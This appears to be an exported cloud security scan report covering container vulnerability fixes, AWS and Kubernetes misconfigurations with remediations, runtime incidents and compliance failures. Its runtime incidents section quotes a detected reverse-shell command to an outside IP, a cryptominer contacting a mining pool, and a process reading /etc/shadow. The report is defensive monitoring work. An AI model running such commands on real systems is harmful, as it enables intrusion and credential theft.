container_vulnerabilities.prisma_recommended_fix: Upgrade immediately. No workaround. Block network access to affected endpoint as temporary mitigation.
Update libssl to 1.1.1w or later. Consider migration to OpenSSL 3.x.
Upgrade OpenSSH to 9.8p1 or set LoginGraceTime 0 as temporary mitigation.
Update runc to 1.1.12. Patch container runtime on all nodes. Affects entire Kubernetes cluster.
Update golang.org/x/net. Implement HTTP/2 rate limiting as mitigation.
Patch libc6. If immediate patch unavailable, disable IPv6 on affected interfaces.

iac_misconfigurations.title: S3 bucket allows public read access
iac_misconfigurations.description: S3 bucket 'payment-receipts-prod' has ACL set to 'public-read'. Sensitive payment receipt documents are exposed to the internet.
iac_misconfigurations.remediation: Set bucket ACL to 'private'. Enable Block Public Access settings. Use pre-signed URLs for authorized access.

iac_misconfigurations.title: IAM policy grants wildcard permissions (*) on all resources
iac_misconfigurations.description: IAM policy attached to EKS service account uses 'Action: *' and 'Resource: *'. Violates principle of least privilege. Allows full AWS account access.
iac_misconfigurations.remediation: Replace wildcard actions with specific permissions required by the service. Apply resource-level restrictions.

iac_misconfigurations.title: RDS instance is publicly accessible
iac_misconfigurations.description: RDS PostgreSQL instance has publicly_accessible = true. Database is exposed to internet traffic on port 5432.
iac_misconfigurations.remediation: Set publicly_accessible = false. Place RDS in private subnet. Use security groups to restrict access to application servers only.

iac_misconfigurations.title: Security group allows unrestricted inbound SSH (0.0.0.0/0 on port 22)
iac_misconfigurations.description: Security group 'bastion-sg' allows SSH from 0.0.0.0/0 and ::/0. SSH brute force and exploitation risk.
iac_misconfigurations.remediation: Restrict SSH to known corporate IP ranges. Use AWS Systems Manager Session Manager as SSH alternative.

iac_misconfigurations.title: EKS cluster has public API server endpoint enabled
iac_misconfigurations.description: EKS cluster API endpoint is accessible from the public internet. Kubernetes API exposed without network restriction.
iac_misconfigurations.remediation: Set endpoint_public_access = false or restrict access via endpoint_public_access_cidrs to trusted IP ranges only.

iac_misconfigurations.title: EBS volumes not encrypted with customer-managed KMS key
iac_misconfigurations.description: 5 EBS volumes attached to production EC2 instances are using AWS-managed keys instead of customer-managed KMS keys. Limits key rotation control.
iac_misconfigurations.remediation: Create customer-managed KMS keys. Encrypt EBS volumes using aws:kms with CMK. Enable automatic key rotation.

iac_misconfigurations.title: Container running as root (UID 0)
iac_misconfigurations.description: Container 'payment-api' does not set securityContext.runAsNonRoot. Process runs as UID 0 (root). Container escape would yield root on host.
iac_misconfigurations.remediation: Add securityContext: runAsNonRoot: true, runAsUser: 1000 to container spec. Rebuild image to run as non-root user.

iac_misconfigurations.title: Privileged container detected
iac_misconfigurations.description: Container 'fluentd-log-agent' has securityContext.privileged: true. Privileged containers can access host namespaces and devices.
iac_misconfigurations.remediation: Remove privileged: true. Grant only required Linux capabilities. Use specific capabilities (CAP_NET_ADMIN) instead of full privilege.

iac_misconfigurations.title: Kubernetes namespace missing NetworkPolicy
iac_misconfigurations.description: Namespace 'production' has no NetworkPolicy defined. All pods can communicate freely. Lateral movement unconstrained.
iac_misconfigurations.remediation: Implement default-deny NetworkPolicy for ingress and egress. Whitelist required pod-to-pod communication explicitly.

iac_misconfigurations.title: ClusterRoleBinding grants cluster-admin to service account
iac_misconfigurations.description: ServiceAccount 'payment-service-sa' in namespace 'production' is bound to 'cluster-admin' ClusterRole. Full cluster access granted.
iac_misconfigurations.remediation: Replace cluster-admin binding with namespace-scoped Role with minimal required permissions.

runtime_incidents.description: Process 'xmrig' detected running in container. Network connections to known mining pool pool.hashvault.pro:443 observed. CPU utilization spiked to 98%.
runtime_incidents.response: Container killed. Image quarantined. Node cordoned.

runtime_incidents.description: bash -i >& /dev/tcp/185.220.101.44/4444 0>&1 detected in container process tree. Outbound connection to known Tor exit node blocked by egress policy.
runtime_incidents.response: Process blocked by runtime policy. Alert triggered. Container flagged for forensic analysis.

runtime_incidents.description: Process 'python3' accessed /etc/shadow and /proc/1/environ outside normal baseline. Possible credential harvesting behavior.
runtime_incidents.response: Alert raised. Process baseline deviation logged. SOC investigation triggered.

top_failures: CIS 2.1.1 — Ensure S3 Bucket Block Public Access is enabled
PCI DSS 6.3.3 — All system components are protected from known vulnerabilities
NIST AC-6 — Principle of Least Privilege not enforced (IAM wildcard policies)
CIS 4.1 — Ensure no security groups allow unrestricted inbound access to port 22
PCI DSS 8.6 — System/application accounts are managed via policies and procedures
